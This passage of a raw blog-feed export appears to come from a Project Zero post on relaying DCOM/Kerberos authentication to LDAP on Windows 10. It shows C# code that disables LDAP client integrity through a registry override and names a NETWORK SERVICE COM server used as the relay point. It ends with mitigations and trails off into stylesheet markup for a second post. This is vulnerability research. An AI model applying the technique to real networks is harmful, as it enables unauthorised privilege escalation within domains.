class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;throw&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;Win32Exception(res);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c19\"&gt;&lt;span class=\"c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12 c13\"&gt;static&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;void&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;LoadLDAPLibrary()&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;string&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;dummy = &lt;/span&gt;&lt;span class=\"c12 c15\"&gt;@&amp;quot;SOFTWARE\\DUMMY&amp;quot;&lt;/span&gt;&lt;span class=\"c6\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;string&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;target = &lt;/span&gt;&lt;span class=\"c12 c15\"&gt;@&amp;quot;System\\CurrentControlSet\\Services\\LDAP&amp;quot;&lt;/span&gt;&lt;span class=\"c6\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;using&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;var&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;key = Registry.CurrentUser.CreateSubKey(dummy, &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;true&lt;/span&gt;&lt;span class=\"c6\"&gt;))&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;using&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;var&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;okey = key.CreateSubKey(target, &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;true&lt;/span&gt;&lt;span class=\"c6\"&gt;))&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; okey.SetValue(&lt;/span&gt;&lt;span class=\"c12 c27\"&gt;&amp;quot;LdapClientIntegrity&amp;quot;&lt;/span&gt;&lt;span class=\"c6\"&gt;, 0, &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; RegistryValueKind.DWord);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; OverrideLocalMachine(key);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c19\"&gt;&lt;span class=\"c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c17 c13\"&gt;try&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; IntPtr lib = LoadLibrary(&lt;/span&gt;&lt;span class=\"c12 c27\"&gt;&amp;quot;wldap32.dll&amp;quot;&lt;/span&gt;&lt;span class=\"c6\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;if&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;(lib == IntPtr.Zero)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c13\"&gt;throw&lt;/span&gt;&lt;span class=\"c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;new&lt;/span&gt;&lt;span class=\"c6\"&gt;&amp;nbsp;Win32Exception();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c12 c17 c13\"&gt;finally&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; OverrideLocalMachine(&lt;/span&gt;&lt;span class=\"c12 c13\"&gt;null&lt;/span&gt;&lt;span class=\"c6\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Registry.CurrentUser.DeleteSubKeyTree(dummy);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c6\"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c12\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;This code redirects the &lt;/span&gt;&lt;span class=\"c4\"&gt;HKEY_LOCAL_MACHINE&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;key and then loads the LDAP library. Once it&amp;#39;s loaded we can then revert the override so that everything else works as expected. We can now repurpose the built-in LDAP library to relay Kerberos authentication to the domain controller. For the final step, we need a privileged COM service to unmarshal the OBJREF to start the process.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c23\" id=\"h.dwt9lb67za71\"&gt;&lt;span class=\"c25 c17\"&gt;Choosing a COM Unmarshaller &lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"c4\"&gt;RemotePotato &lt;/span&gt;&lt;span&gt;attack assumes that a more privileged user is authenticated on the same machine. However I wanted to see what I could do &lt;/span&gt;&lt;span class=\"c4\"&gt;without&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;that requirement. Realistically the only thing that can be done is to relay the computer&amp;#39;s domain account to the LDAP server. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;To get access to authentication for the computer account, we need to unmarshal the OBJREF inside a process running as either &lt;/span&gt;&lt;span class=\"c4\"&gt;SYSTEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=\"c4\"&gt;NETWORK SERVICE&lt;/span&gt;&lt;span class=\"c9\"&gt;. These local accounts are mapped to the computer account when authenticating to another machine on the network. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;We do have one big limitation on the selection of a suitable COM server: it must make the RPC connection using the &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_PKT_CONNECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;authentication level. Anything above that will enable Integrity on the authentication which will prevent us relaying to LDAP. Fortunately &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_PKT_CONNECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the default setting for DCOM, but unfortunately all services which use the &lt;/span&gt;&lt;span class=\"c4\"&gt;svchost &lt;/span&gt;&lt;span&gt;process change that default to &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_PKT&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;which enables Integrity.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;After a bit of hunting around with &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"http://oleview.net\"&gt;OleViewDotNet&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, I found a good candidate class, &lt;/span&gt;&lt;span class=\"c4\"&gt;CRemoteAppLifetimeManager&lt;/span&gt;&lt;span&gt;&amp;nbsp;(CLSID: 0bae55fc-479f-45c2-972e-e951be72c0c1) which is hosted in its own executable, runs as &lt;/span&gt;&lt;span class=\"c4\"&gt;NETWORK SERVICE&lt;/span&gt;&lt;span class=\"c9\"&gt;, and doesn&amp;#39;t change any default settings as shown below.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c5\"&gt;&lt;span class=\"c4\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjY0GTONUmsfjcV_gBc77i0Cvy_4WgZ_89837ArCqW3GfvyXBsIinDGdcZxxo5Sj6WWjTd0DsNFt7O95UMjb_-QiwHrzdvJo3y9HWH6oxQVnBeKjwLUqnVGmwh9kqOsvM9YfZsIiSgCdX3io1tg31NwkHUMfS3KTEGoJxbRrtC15Z5n72WuCSS92zOb/s945/image3%20%283%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjY0GTONUmsfjcV_gBc77i0Cvy_4WgZ_89837ArCqW3GfvyXBsIinDGdcZxxo5Sj6WWjTd0DsNFt7O95UMjb_-QiwHrzdvJo3y9HWH6oxQVnBeKjwLUqnVGmwh9kqOsvM9YfZsIiSgCdX3io1tg31NwkHUMfS3KTEGoJxbRrtC15Z5n72WuCSS92zOb/s945/image3%20%283%29.png\" border=\"0\" alt=\"Screenshot of the OleViewDotNet showing the security flags of the CRemoteAppLifetimeManager COM server\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;The server doesn&amp;#39;t change the default impersonation level from &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_IMP_LEVEL_IDENTIFY&lt;/span&gt;&lt;span&gt;, which means the negotiated token will only be at &lt;/span&gt;&lt;span class=\"c4\"&gt;SecurityIdentification&lt;/span&gt;&lt;span&gt;&amp;nbsp;level. For LDAP, this doesn&amp;#39;t matter as it only uses the token for access checking, not to open resources. However, this would prevent using the same authentication to access something like the SMB server. I&amp;#39;m confident that given enough effort, a COM server with both &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_PKT_CONNECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_IMP_LEVEL_IMPERSONATE&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;could be found, but it wasn&amp;#39;t necessary for my exploit.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c23\" id=\"h.38szqoyv0vag\"&gt;&lt;span class=\"c25 c17\"&gt;Wrapping Up&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;That&amp;#39;s a somewhat complex exploit. However, it does allow for authentication relay, with arbitrary Kerberos tokens from a local user to LDAP on a default Windows 10 system. Hopefully it might provide some ideas of how to implement something similar without always needing to write your protocol servers and clients and just use what&amp;#39;s already available.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;This exploit is very similar to the existing RemotePotato exploit that Microsoft have already stated will not be fixed. This is because Microsoft considers authentication relay attacks to be an issue with the configuration of the Windows network, such as not enforcing signing on LDAP, rather than the particular technique used to generate the authentication relay. As I mentioned in the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\"&gt;previous blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;, at most this would be assessed as a Moderate severity issue which does not reach the bar for fixing as part of regular updates (or potentially, not being fixed at all).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c5\"&gt;&lt;span&gt;As for mitigating this issue without it being fixed by Microsoft, a system administrator should follow Microsoft&amp;#39;s recommendations to enable signing and/or encryption on any sensitive service in the domain, especially LDAP. They can also enable Extended Protection for Authentication where the service is protected by TLS. They can also configure the &lt;/span&gt;&lt;span class=\"c2\"&gt;&lt;a class=\"c211\" href=\"https://docs.microsoft.com/en-us/windows/win32/com/setting-machine-wide-security-using-dcomcnfg#setting-system-wide-default-authentication-level\"&gt;default DCOM authentication level&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to be &lt;/span&gt;&lt;span class=\"c4\"&gt;RPC_C_AUTHN_LEVEL_PKT_INTEGRITY&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;or above. These changes would make the relay of Kerberos, or NTLM significantly less useful.&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/5634534606665421566/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/5634534606665421566"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/5634534606665421566"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html","@title":"Windows Exploitation Tricks: Relaying DCOM Authentication"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidf0_fh87eJd499r4V31gq2EoxkP1fptUl5KU9lwkDp87pFnA3qdmY3eGRB2HqY878TZp7JhPF7F_LpNcl0ax6g6bsSWgv9sSBUx-SFUXZGssDtAFvL_P_ROZPAZW9tdiUz_06DNaFgIUsqBit5HpztFCv67tZF8EILTkQmONHwZ9U7H5G0D5Dg079/s72-c/image2%20%285%29.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-6510029969921067809","published":"2021-10-20T09:26:00.000-07:00","updated":"2021-10-21T09:00:10.361-07:00","title":{"@type":"text","#text":"Using Kerberos for Authentication Relay Attacks"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;ol.lst-kix_d25vxsk234hv-6{list-style-type:none}.lst-kix_wkcrlfh2qk3l-7&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-7}.lst-kix_i2wckd3yhfhe-0&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-0}ol.lst-kix_i2wckd3yhfhe-5.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-5 0}ol.lst-kix_d25vxsk234hv-5{list-style-type:none}ol.lst-kix_d25vxsk234hv-4{list-style-type:none}ol.lst-kix_jp16emg17n48-2.start{counter-reset:lst-ctn-kix_jp16emg17n48-2 0}ol.lst-kix_d25vxsk234hv-3{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-8{list-style-type:none}ol.lst-kix_d25vxsk234hv-2{list-style-type:none}ol.lst-kix_d25vxsk234hv-3.start{counter-reset:lst-ctn-kix_d25vxsk234hv-3 0}ol.lst-kix_d25vxsk234hv-1{list-style-type:none}ol.lst-kix_d25vxsk234hv-0{list-style-type:none}.lst-kix_d25vxsk234hv-4&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-4}.lst-kix_jp16emg17n48-8&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-8}ul.lst-kix_fmj6vk2ylkib-0{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-1{list-style-type:none}ol.lst-kix_d25vxsk234hv-6.start{counter-reset:lst-ctn-kix_d25vxsk234hv-6 0}ol.lst-kix_i2wckd3yhfhe-4{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-8{list-style-type:none}.lst-kix_wkcrlfh2qk3l-8&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-8}ol.lst-kix_i2wckd3yhfhe-5{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-6{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-6{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-7{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-7{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-0{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-4{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-1{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-5{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-2{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-2{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-3{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-3{list-style-type:none}.lst-kix_2yktnm17nyl7-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_2yktnm17nyl7-3&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_2yktnm17nyl7-8{list-style-type:none}ul.lst-kix_2yktnm17nyl7-7{list-style-type:none}ul.lst-kix_2yktnm17nyl7-6{list-style-type:none}.lst-kix_d25vxsk234hv-2&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-2}.lst-kix_2yktnm17nyl7-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_d25vxsk234hv-5&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-5}.lst-kix_jp16emg17n48-7&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-7}ol.lst-kix_jp16emg17n48-8.start{counter-reset:lst-ctn-kix_jp16emg17n48-8 0}ol.lst-kix_d25vxsk234hv-0.start{counter-reset:lst-ctn-kix_d25vxsk234hv-0 0}.lst-kix_2yktnm17nyl7-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_jp16emg17n48-4&gt;li:before{content:\"(\" counter(lst-ctn-kix_jp16emg17n48-4,lower-latin) \") \"}ol.lst-kix_wkcrlfh2qk3l-6.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-6 0}.lst-kix_jp16emg17n48-3&gt;li:before{content:\"(\" counter(lst-ctn-kix_jp16emg17n48-3,decimal) \") \"}.lst-kix_jp16emg17n48-5&gt;li:before{content:\"(\" counter(lst-ctn-kix_jp16emg17n48-5,lower-roman) \") \"}ul.lst-kix_2yktnm17nyl7-1{list-style-type:none}.lst-kix_jp16emg17n48-0&gt;li:before{content:\"\" counter(lst-ctn-kix_jp16emg17n48-0,decimal) \") \"}ul.lst-kix_2yktnm17nyl7-0{list-style-type:none}.lst-kix_jp16emg17n48-1&gt;li:before{content:\"\" counter(lst-ctn-kix_jp16emg17n48-1,lower-latin) \") \"}ul.lst-kix_2yktnm17nyl7-5{list-style-type:none}.lst-kix_jp16emg17n48-2&gt;li:before{content:\"\" counter(lst-ctn-kix_jp16emg17n48-2,lower-roman) \") \"}.lst-kix_wkcrlfh2qk3l-6&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-6}ul.lst-kix_2yktnm17nyl7-4{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-0.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-0 0}ol.lst-kix_jp16emg17n48-5.start{counter-reset:lst-ctn-kix_jp16emg17n48-5 0}ul.lst-kix_2yktnm17nyl7-3{list-style-type:none}ol.lst-kix_d25vxsk234hv-8{list-style-type:none}ul.lst-kix_2yktnm17nyl7-2{list-style-type:none}ol.lst-kix_d25vxsk234hv-7{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-3.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-3 0}.lst-kix_jp16emg17n48-0&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-0}.lst-kix_jp16emg17n48-7&gt;li:before{content:\"\" counter(lst-ctn-kix_jp16emg17n48-7,lower-latin) \". \"}ol.lst-kix_i2wckd3yhfhe-3.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-3 0}.lst-kix_jp16emg17n48-6&gt;li:before{content:\"\" counter(lst-ctn-kix_jp16emg17n48-6,decimal) \". \"}ol.lst-kix_i2wckd3yhfhe-7.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-7 0}.lst-kix_jp16emg17n48-6&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-6}.lst-kix_wkcrlfh2qk3l-5&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-5}ol.lst-kix_jp16emg17n48-4.start{counter-reset:lst-ctn-kix_jp16emg17n48-4 0}.lst-kix_jp16emg17n48-8&gt;li:before{content:\"\" counter(lst-ctn-kix_jp16emg17n48-8,lower-roman) \". \"}ol.lst-kix_jp16emg17n48-3.start{counter-reset:lst-ctn-kix_jp16emg17n48-3 0}ol.lst-kix_wkcrlfh2qk3l-4.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-4 0}.lst-kix_wkcrlfh2qk3l-2&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-2}ol.lst-kix_i2wckd3yhfhe-2.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-2 0}.lst-kix_d25vxsk234hv-0&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-0}ol.lst-kix_d25vxsk234hv-5.start{counter-reset:lst-ctn-kix_d25vxsk234hv-5 0}ol.lst-kix_jp16emg17n48-8{list-style-type:none}.lst-kix_d25vxsk234hv-6&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-6}ol.lst-kix_jp16emg17n48-7{list-style-type:none}.lst-kix_i2wckd3yhfhe-1&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-1}ol.lst-kix_i2wckd3yhfhe-8.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-8 0}.lst-kix_i2wckd3yhfhe-4&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-4}ol.lst-kix_jp16emg17n48-4{list-style-type:none}ol.lst-kix_jp16emg17n48-3{list-style-type:none}ol.lst-kix_jp16emg17n48-6{list-style-type:none}ol.lst-kix_jp16emg17n48-5{list-style-type:none}ol.lst-kix_jp16emg17n48-0{list-style-type:none}ol.lst-kix_jp16emg17n48-2{list-style-type:none}.lst-kix_d25vxsk234hv-3&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-3}.lst-kix_i2wckd3yhfhe-7&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-7}ol.lst-kix_jp16emg17n48-1{list-style-type:none}.lst-kix_fmj6vk2ylkib-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_wkcrlfh2qk3l-1&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-1}.lst-kix_fmj6vk2ylkib-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_fmj6vk2ylkib-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_fmj6vk2ylkib-3&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_wkcrlfh2qk3l-8.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-8 0}.lst-kix_i2wckd3yhfhe-1&gt;li:before{content:\"\" counter(lst-ctn-kix_i2wckd3yhfhe-1,lower-latin) \") \"}.lst-kix_jp16emg17n48-2&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-2}.lst-kix_i2wckd3yhfhe-2&gt;li:before{content:\"\" counter(lst-ctn-kix_i2wckd3yhfhe-2,lower-roman) \") \"}.lst-kix_i2wckd3yhfhe-6&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-6}.lst-kix_i2wckd3yhfhe-4&gt;li:before{content:\"(\" counter(lst-ctn-kix_i2wckd3yhfhe-4,lower-latin) \") \"}.lst-kix_wkcrlfh2qk3l-7&gt;li:before{content:\"\" counter(lst-ctn-kix_wkcrlfh2qk3l-7,lower-latin) \". \"}.lst-kix_wkcrlfh2qk3l-8&gt;li:before{content:\"\" counter(lst-ctn-kix_wkcrlfh2qk3l-8,lower-roman) \". \"}.lst-kix_i2wckd3yhfhe-3&gt;li:before{content:\"(\" counter(lst-ctn-kix_i2wckd3yhfhe-3,decimal) \") \"}.lst-kix_i2wckd3yhfhe-5&gt;li:before{content:\"(\" counter(lst-ctn-kix_i2wckd3yhfhe-5,lower-roman) \") \"}.lst-kix_jp16emg17n48-3&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-3}.lst-kix_i2wckd3yhfhe-5&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-5}ol.lst-kix_jp16emg17n48-6.start{counter-reset:lst-ctn-kix_jp16emg17n48-6 0}.lst-kix_i2wckd3yhfhe-8&gt;li:before{content:\"\" counter(lst-ctn-kix_i2wckd3yhfhe-8,lower-roman) \". \"}.lst-kix_d25vxsk234hv-8&gt;li:before{content:\"\" counter(lst-ctn-kix_d25vxsk234hv-8,lower-roman) \". 